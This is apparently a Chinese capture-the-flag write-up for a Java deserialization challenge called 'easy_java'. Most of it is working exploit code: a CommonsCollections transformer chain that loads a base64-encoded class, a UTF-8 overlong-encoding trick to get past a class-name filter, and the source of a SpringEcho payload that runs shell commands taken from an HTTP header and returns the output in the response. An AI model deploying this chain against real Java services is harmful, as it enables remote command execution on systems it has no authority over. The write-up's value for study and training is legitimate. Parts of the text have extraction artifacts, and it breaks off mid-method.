---
tags: [Java反序列化, CommonsBeanutils, CommonsCollections, SpringEcho, UTF-8 Overlong Encoding绕过, RCE]
---

# easy_java

 

题目提示 jdk17 + cb, 实际上新版本 commons-beanutils 一般会同时带上 commons-

collections

 

测试后猜测环境不出网 , 于是打一个 SpringEcho 回显

 

题目会在反序列化前过滤 org.apache 开头的类, 试了一下发现可以用 utf-8 overlong encoding 绕过

```
package com .example .easyjava;

import org.apache .commons .collections .Transformer;
import org.apache .commons .collections .functors .ChainedTransformer;
import org.apache .commons .collections .functors .ConstantTransformer;
import
org .apache .commons .collections .functors .InstantiateTransformer;
import org .apache .commons .collections .functors .InvokerTransformer;
import org.apache .commons .collections .keyvalue .TiedMapEntry;
import org .apache .commons .collections .map .LazyMap;

import java.lang .invoke .MethodHandles;
import java.util .Base64;
import java.util .HashMap;
import java.util .Map;

public class Demo {
public static void main(String[] args) throws Exception {
UnsafeUtil .patchModule(Demo .class);
UnsafeUtil .patchModule(ReflectUtil .class);

UnsafeUtil .patchModule(UTF8OverlongObjectOutputStream .class);

String s =
"yv66vgAAADMBLAgAAgEAFENhY2hlLUNvbnRyb2wtSGJvYm5mCgAEAAUHAAYMAAcACAEA
EGphdmEvbGFuZy9PYmplY3QBAAY8aW5pdD4BAAMoKVYIAAoBAA9zdW4ubWlzYy5VbnNhZ
mUKAAwADQcADgwADwAQAQAPamF2YS9sYW5nL0NsYXNzAQAHZm9yTmFtZQEAJShMamF2YS
9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsIABIBAAl0aGVVbnNhZmUKAAwAFAw
AFQAWAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEv
bGFuZy9yZWZsZWN0L0ZpZWxkOwoAGAAZBwAaDAAbABwBABdqYXZhL2xhbmcvcmVmbGVjd
C9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWCgAYAB4MAB8AIAEAA2dldAEAJihMam
F2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7BwAiAQAPc3VuL21pc2MvVW5
zYWZlCAAkAQAJZ2V0TW9kdWxlCgAMACYMACcAKAEAEWdldERlY2xhcmVkTWV0aG9kAQBA
KExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZ
mxlY3QvTWV0aG9kOwoAKgArBwAsDAAtAC4BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2
QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0Oyl
MamF2YS9sYW5nL09iamVjdDsHADABACxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlv
bnMvZnVuY3RvcnMvRXZpbAgAMgEABm1vZHVsZQoAIQA0DAA1ADYBABFvYmplY3RGaWVsZ
E9mZnNldAEAHChMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7KUoKACEAOAwAOQA6AQAPZ2
V0QW5kU2V0T2JqZWN0AQA5KExqYXZhL2xhbmcvT2JqZWN0O0pMamF2YS9sYW5nL09iamV
jdDspTGphdmEvbGFuZy9PYmplY3Q7BwA8AQATamF2YS9sYW5nL0V4Y2VwdGlvbgoALwA+
DAA/AAgBAANydW4KAEEAQgcAQwwARABFAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlb
nRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwoAQQBHDABIAEkBABVnZXRDb250ZX
h0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7CABLAQA8b3JnLnN
wcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlJlcXVlc3RDb250ZXh0SG9s
ZGVyCgBNAE4HAE8MAFAAEAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEACWxvYWRDbGFzc
wgAUgEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzCgAvAFQMAFUAVgEADGludm9rZU1ldGhvZA
EAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9
PYmplY3Q7CABYAQAKZ2V0UmVxdWVzdAgAWgEAC2dldFJlc3BvbnNlCgAEAFwMAF0AXgEA
CGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwgAYAEACWdldEhlYWRlcgcAYgEAE
GphdmEvbGFuZy9TdHJpbmcKAAwAZAwAZQAoAQAJZ2V0TWV0aG9kCgAvAGcMAGgAaQEAEG
dldFJlcUhlYWRlck5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwoAYQBrDABsAG0BAAd
pc0VtcHR5AQADKClaCABvAQAJZ2V0V3JpdGVyBwBxAQAOamF2YS9pby9Xcml0ZXIKAC8A
cwwAdAB1AQAEZXhlYwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpb
mc7CgBwAHcMAHgAeQEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWCgBwAHsMAH
wACAEABWZsdXNoCgBwAH4MAH8ACAEABWNsb3NlCACBAQAHb3MubmFtZQoAgwCEBwCFDAC
GAHUBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkKAGEAiAwAiQBpAQALdG9M
b3dlckNhc2UIAIsBAAN3aW4KAGEAjQwAjgCPAQAIY29udGFpbnMBABsoTGphdmEvbGFuZ
y9DaGFyU2VxdWVuY2U7KVoIAJEBAAcvYmluL3NoCACTAQACLWMIAJUBAAdjbWQuZXhlCA
CXAQACL2MKAJkAmgcAmwwAnACdAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1
lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgCZAJ8MAHQAoAEAKChbTGphdmEvbGFuZy9T
dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsKAKIAowcApAwApQCmAQARamF2YS9sYW5nL
1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07Bw
CoAQARamF2YS91dGlsL1NjYW5uZXIKAKcAqgwABwCrAQAYKExqYXZhL2lvL0lucHV0U3R
yZWFtOylWCACtAQACXGEKAKcArwwAsACxAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xh
bmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7CACzAQAACgCnALUMALYAbQEAB2hhc
05leHQHALgBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgoAtwAFCgC3ALsMALwAvQEABm
FwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGV
yOwoApwC/DADAAGkBAARuZXh0CgC3AMIMAMMAaQEACHRvU3RyaW5nCgA7AMUMAMYAaQEA
CmdldE1lc3NhZ2UKAC8AyAwAVQDJAQBdKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhb
mcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzO1tMamF2YS9sYW5nL09iamVjdDspTGphdm
EvbGFuZy9PYmplY3Q7CgAMAMsMAMwAzQEAEmdldERlY2xhcmVkTWV0aG9kcwEAHSgpW0x
qYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7CgAqAM8MANAAaQEAB2dldE5hbWUKAGEA0gwA
0wDUAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaCgAqANYMANcA2AEAEWdld
FBhcmFtZXRlclR5cGVzAQAUKClbTGphdmEvbGFuZy9DbGFzczsHANoBAB9qYXZhL2xhbm
cvTm9TdWNoTWV0aG9kRXhjZXB0aW9uCgAMANwMAN0AXgEADWdldFN1cGVyY2xhc3MKANk
A3wwABwB5CgAqABkHAOIBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgcA
5AEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uCgDhAMUKAOMA3wEABENvZGUBAA9Ma
W5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAuTG9yZy9hcG
FjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9mdW5jdG9ycy9FdmlsOwEAC3Vuc2FmZUNsYXN
zAQARTGphdmEvbGFuZy9DbGFzczsBAAt1bnNhZmVGaWVsZAEAGUxqYXZhL2xhbmcvcmVm
bGVjdC9GaWVsZDsBAAZ1bnNhZmUBABFMc3VuL21pc2MvVW5zYWZlOwEAD2dldE1vZHVsZ
U1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQASTGphdmEvbGFuZy9PYm
plY3Q7AQADY2xzAQAGb2Zmc2V0AQABSgEADVN0YWNrTWFwVGFibGUBAApFeGNlcHRpb25
zAQAGd3JpdGVyAQAQTGphdmEvaW8vV3JpdGVyOwEAEXJlcXVlc3RBdHRyaWJ1dGVzAQAH
cmVxdWVzdAEACHJlc3BvbnNlAQAKZ2V0SGVhZGVyTQEAA2NtZAEAEkxqYXZhL2xhbmcvU
3RyaW5nOwEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAdpc0
xpbnV4AQABWgEABm9zVHlwZQEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4
BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEA
B2V4ZWNSZXMBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEdmFyOAcBCAcBEwEAE
2phdmEvaW8vSW5wdXRTdHJlYW0BAAx0YXJnZXRPYmplY3QBAAptZXRob2ROYW1lBwEXAQ
AramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgEAAWkBAAF
JAQAHbWV0aG9kcwEAG1tMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABXZhcjEyAQAh
TGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAFdmFyMTABACJMamF2YS9sY
W5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb247AQAFdmFyMTEBAANvYmoBAApwYXJhbUNsYX
p6AQASW0xqYXZhL2xhbmcvQ2xhc3M7AQAFcGFyYW0BABNbTGphdmEvbGFuZy9PYmplY3Q
7AQAFY2xhenoBAAZtZXRob2QBAAl0ZW1wQ2xhc3MHARsBAApTb3VyY2VGaWxlAQAJRXZp
bC5qYXZhACEALwAEAAAAAAAGAAIAaABpAAEA5wAAAC0AAQABAAAAAxIBsAAAAAIA6AAAA
AYAAQAAABMA6QAAAAwAAQAAAAMA6gDrAAAAAQAHAAgAAgDnAAABIAAFAAkAAABeKrcAAx
IJuAALTCsSEbYAE00sBLYAFywBtgAdwAAhThIMEiMDvQAMtgAlOgQZBBIEA70ABLYAKTo
FEi86Bi0SDBIxtgATtgAzNwctGQYWBxkFtgA3V6cABEwqtgA9sQABAAQAVQBYADsAAwDo
AAAAOgAOAAAAFgAEABgACgAZABEAGgAWABsAHwAcACwAHQA5AB4APQAfAEoAIABVACIAW
AAhAFkAJABdACUA6QAAAFIACAAKAEsA7ADtAAEAEQBEAO4A7wACAB8ANgDwAPEAAwAsAC
kA8gDzAAQAOQAcADIA9AAFAD0AGAD1AO0ABgBKAAsA9gD3AAcAAABeAOoA6wAAAPgAAAA
QAAL/AFgAAQcALwABBwA7AAD5AAAABAABADsAAQA/AAgAAQDnAAABQgAGAAgAAACDuABA
tgBGTCorEkq2AEwSUbcAU00qLBJXtwBTTiosElm3AFM6BC22AFsSXwS9AAxZAxJhU7YAY
zoFGQUtBL0ABFkDKrcAZlO2ACnAAGE6BhkGxgAtGQa2AGqaACUqGQQSbrcAU8AAcDoHGQ
cqGQa3AHK2AHYZB7YAehkHtgB9pwAETbEAAQAHAH4AgQA7AAMA6AAAADoADgAAACgABwA
rABQALAAcAC0AJQAuADkALwBPADAAXAAxAGkAMgB0ADMAeQA0AH4ANwCBADYAggA5AOkA
AABSAAgAaQAVAPoA+wAHABQAagD8APQAAgAcAGIA/QD0AAMAJQBZAP4A9AAEADkARQD/A
PMABQBPAC8BAAEBAAYAAACDAOoA6wAAAAcAfAECAQMAAQD4AAAADQAD/AB+BwBNQgcAOw
AAAgB0AHUAAQDnAAABkQAEAAgAAACXBD0SgLgAgk4txgARLbYAhxKKtgCMmQAFAz0cmQA
YBr0AYVkDEpBTWQQSklNZBStTpwAVBr0AYVkDEpRTWQQSllNZBStTOgS4AJgZBLYAnrYA
oToFuwCnWRkFtwCpEqy2AK46BhKyOgcZBrYAtJkAH7sAt1m3ALkZB7YAuhkGtgC+tgC6t
gDBOgen/98ZB7BNLE4ttgDEsAABAAAAjgCPADsAAwDoAAAAMgAMAAAAPQACAD4ACAA/AB
gAQAAaAEMARwBEAFQARQBkAEgAjABLAI8ATACQAE0AkgBOAOkAAABmAAoAAgCNAQQBBQA
CAAgAhwEGAQEAAwBHAEgBBwEIAAQAVAA7AQkBCgAFAGQAKwELAQwABgBoACcBDQEBAAcA
kgAFAQ4BDwADAJAABwEQAQ8AAgAAAJcA6gDrAAAAAACXAQABAQABAPgAAAA8AAb9ABoBB
wBhGFEHARH/ACIACAcALwcAYQEHAGEHAREHARIHAKcHAGEAACP/AAIAAgcALwcAYQABBw
A7AAIAVQBWAAIA5wAAAE0ABQADAAAADyorLAO9AAwDvQAEtwDHsAAAAAIA6AAAAAYAAQA
AAFMA6QAAACAAAwAAAA8A6gDrAAAAAAAPARQA9AABAAAADwEVAQEAAgD5AAAACAADANkA
4QEWAAIAVQDJAAIA5wAAAiMAAwAKAAAAzCvBAAyZAAorwAAMpwAHK7YAWzoFAToGGQU6B
xkGxwBkGQfGAF8txwBDGQe2AMo6CAM2CRUJGQi+ogAuGQgVCTK2AM4stgDRmQAZGQgVCT
K2ANW+mgANGQgVCTI6BqcACYQJAaf/0KcADBkHLC22ACU6Bqf/qToIGQe2ANs6B6f/nRk
GxwAMuwDZWSy3AN6/GQYEtgDgK8EADJkAGxkGARkEtgApsDoIuwDjWRkItgDltwDmvxkG
KxkEtgApsDoIuwDjWRkItgDltwDmvwADACUAcgB1ANkAnACkAKUA4QC0ALwAvQDhAAMA6
AAAAG4AGwAAAFcAFABYABcAWQAbAFsAJQBdACkAXgAwAGAAOwBhAFYAYgBdAGMAYABgAG
YAZgBpAGcAcgBrAHUAaQB3AGoAfgBrAIEAbgCGAG8AjwBxAJUAcgCcAHQApQB1AKcAdgC
0AHoAvQB7AL8AfADpAAAAhAANADMAMwEYARkACQAwADYBGgEbAAgAdwAHARwBHQAIAKcA
DQEeAR8ACAC/AA0BIAEfAAgAAADMAOoA6wAAAAAAzAEhAPQAAQAAAMwBFQEBAAIAAADMA
SIBIwADAAAAzAEkASUABAAUALgBJgDtAAUAFwC1AScA8wAGABsAsQEoAO0ABwD4AAAALw
AODkMHAAz+AAgHAAwHACoHAAz9ABcHASkBLPkABQIIQgcA2QsNVQcA4Q5IBwDhAPkAAAA
IAAMA2QEWAOEAAQEqAAAAAgEr" ;
byte[] data = Base64 .getDecoder() .decode(s);

Transformer[] transformers = new Transformer[]{
new ConstantTransformer(MethodHandles .class),
new InvokerTransformer("getDeclaredMethod" , new
Class[]{String .class , Class[] .class}, new Object[]{"lookup" , new
Class[0]}),
new InvokerTransformer("invoke" , new Class[]
{Object .class , Object[] .class}, new Object[]{null , new Object[0]}),
new InvokerTransformer("defineClass" , new Class[]
{byte[] .class}, new Object[]{data}),
new InstantiateTransformer(new Class[0], new
Object[0]),
new ConstantTransformer(1)
};



```

```
SpringEcho 源码
Field unsafeField =
unsafeClass .getDeclaredField("theUnsafe" );
unsafeField .setAccessible(true);
Unsafe unsafe = (Unsafe)unsafeField.get((Object)null);
Method getModuleMethod =
Class .class .getDeclaredMethod("getModule" );
Object module = getModuleMethod.invoke(Object .class);
Class cls = Evil .class;
long offset =
unsafe .objectFieldOffset(Class .class .getDeclaredField("module" ));
unsafe .getAndSetObject(cls , offset , module);
} catch (Exception var9) {
}

this .run ();
}

public void run() {
ClassLoader classLoader =
Thread .currentThread().getContextClassLoader();

try {
Object requestAttributes =
this .invokeMethod(classLoader .loadClass("org .springframework.web .cont
ext .request .RequestContextHolder" ), "getRequestAttributes" );
Object request = this .invokeMethod(requestAttributes ,
"getRequest" );
Object response = this .invokeMethod(requestAttributes ,
"getResponse" );
Method getHeaderM =
request.getClass().getMethod("getHeader" , String .class);
String cmd = (String)getHeaderM.invoke(request ,
this .getReqHeaderName());
if (cmd != null && !cmd .isEmpty()) {
Writer writer = (Writer)this .invokeMethod(response ,
"getWriter" );
writer .write(this .exec(cmd));
writer .flush();
writer .close();
}
} catch (Exception var8) {

}
}

private String exec(String cmd) {
try {
boolean isLinux = true;
String osType = System.getProperty("os .name" );
if (osType != null &&
osType.toLowerCase() .contains("win" )) {
isLinux = false;
}

String[] cmds = isLinux ? new String[]{"/bin/sh" , "-c" ,
cmd} : new String[]{"cmd .exe" , "/c" , cmd};
InputStream in =
Runtime .getRuntime() .exec(cmds).getInputStream();
Scanner s = (new Scanner(in)) .useDelimiter("\\a" );

String execRes;
for(execRes = ""; s .hasNext(); execRes = execRes +
s .next()) {
}

return execRes;
} catch (Exception var8) {
Exception var8 = var8;
Exception e = var8;
return e .getMessage();
}
}

private Object invokeMethod(Object targetObject , String
methodName) throws NoSuchMethodException , IllegalAccessException ,
InvocationTargetException {
return this .invokeMethod(targetObject , methodName , new
Class[0], new Object[0]);
}


private Object invokeMethod(Object obj , String methodName ,
Class[] paramClazz , Object[] param) throws NoSuchMethodException , InvocationTargetException , IllegalAccessException {
Class clazz = obj instanceof Class ? (Class)obj :
obj.getClass();
Method method = null;
Class tempClass = clazz;

while(method == null && tempClass != null) {
try {
if (paramClazz == null) {
Method[] methods =
tempClass .getDeclaredMethods();

for(int i = 0; i < methods .length; ++i) {
if (methods[i].getName() .equals(methodName)
&& methods[i].getParameterTypes() .length == 0) {
method = methods[i];
break;
}
}
} else {
method = tempClass .getDeclaredMethod(methodName ,
paramClazz);
}
} catch (NoSuchMethodException var12) {
tempClass = tempClass .getSuperclass();
}
}

if (method == null) {
throw new NoSuchMethodException(methodName);
} else {
method .setAccessible(true);
if (obj instanceof Class) {
try {
return method .invoke((Object)null , param);
} catch (IllegalAccessException var10) {
throw new RuntimeException(var10.getMessage());
}
} else {


utf-8 overlong encoding 参考
https://github.com/qi4L/JYso/blob/master/src/main/java/com/qi4l/jndi/gadgets/utils/utf8Ov erlongEncoding/UTF8OverlongObjectOutputStream.java
```

